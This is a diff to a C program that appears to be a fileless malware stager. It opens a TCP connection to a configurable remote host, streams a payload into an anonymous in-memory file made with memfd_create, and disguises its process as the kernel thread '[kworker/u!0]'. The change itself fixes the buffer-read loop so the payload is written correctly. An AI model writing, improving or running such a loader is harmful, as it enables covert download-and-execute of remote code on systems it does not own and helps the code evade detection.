@@ -27,6 +27,7 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 // Got index from http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
 #define __NR_memfd_create 319
 #define MFD_CLOEXEC 1
+#define BUF_SIZE 1024
  
 static inline int memfd_create(const char *name, unsigned int flags) {
     return syscall(__NR_memfd_create, name, flags);
@@ -37,14 +38,14 @@ extern char        **environ;
 int
 main (int argc, char **argv)
 {
-  int                fd, s;
+  int                fd, s, l;
   struct sockaddr_in addr;
   addr.sin_family = AF_INET;
   addr.sin_port = htons(P0RT);
   addr.sin_addr.s_addr = inet_addr("CH4NG3M3");
   memset(addr.sin_zero, '\0', sizeof addr.sin_zero);
   char               *args[2]= {"[kworker/u!0]", NULL};
-  char               buf[1024];
+  char               buf[BUF_SIZE];
  
   // Connect
   if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) exit (1);
@@ -53,8 +54,9 @@ main (int argc, char **argv)
  
   while (1)
     {
-      if ((read (s, buf, 1024) ) <= 0) break;
-      write (fd, buf, 1024);
+      if ((l = read (s, buf, BUF_SIZE) ) <= 0) break;
+      write (fd, buf, l);
+      if (l < BUF_SIZE) break;
     }
   close (s);
   
